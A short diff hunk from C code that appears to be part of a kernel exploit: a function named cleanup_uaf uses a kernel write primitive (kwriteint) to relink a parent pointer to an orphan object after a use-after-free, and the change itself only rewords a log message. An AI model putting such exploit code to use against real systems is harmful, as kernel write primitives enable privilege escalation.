@@ -120,7 +120,7 @@ bool cleanup_uaf() {
     return false;
   }
 
-  printf("[+] Found parent and orphan: %p -> %p\n", parent, orphan);
+  printf("[+] Fixed link: %p -> %p\n", parent, orphan);
 
   kwriteint((u32 *)parent, (u32)orphan);
   return true;
